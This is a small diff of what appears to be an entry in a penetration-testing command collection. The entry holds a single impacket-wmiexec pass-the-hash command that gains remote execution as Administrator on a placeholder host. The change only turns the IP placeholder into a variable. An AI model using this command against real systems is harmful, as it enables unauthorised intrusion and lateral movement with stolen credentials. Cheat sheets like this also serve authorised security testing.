@@ -6,4 +6,4 @@ metadata:
   author: "Unknown"
 
 content: |
-  impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM-hash> Administrator@<IP>
+  impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM-hash> Administrator@$IP
